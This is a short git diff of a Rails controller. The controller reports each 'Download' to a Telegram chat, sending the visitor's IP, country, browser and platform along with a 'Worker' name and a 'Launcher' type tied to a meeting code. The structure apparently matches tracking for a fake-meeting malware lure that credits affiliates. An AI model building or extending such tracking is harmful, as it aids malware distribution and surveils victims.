@@ -1,6 +1,4 @@
 class TelegramMessagesController < ApplicationController
-  skip_before_action :verify_authenticity_token
-
   def create
     meeting = Meeting.find_by(code: params[:value].downcase)
 
@@ -17,6 +15,6 @@ class TelegramMessagesController < ApplicationController
     end
 
     text = " #define\n⚠️ Download ⚠️\n🔗 IP: #{ip}\n🌎 Country: #{country}\n👨🏻‍💻 Worker: #{meeting.name} #{meeting.code.upcase}\n📑 Type: Launcher\n💻 Platform: #{params['platform']}\n🌐 Browser: #{params['browser']}"
-    @bot.api.send_message(chat_id: -1002117494784, text:)
+    # @bot.api.send_message(chat_id: -1002117494784, text:)
   end
 end
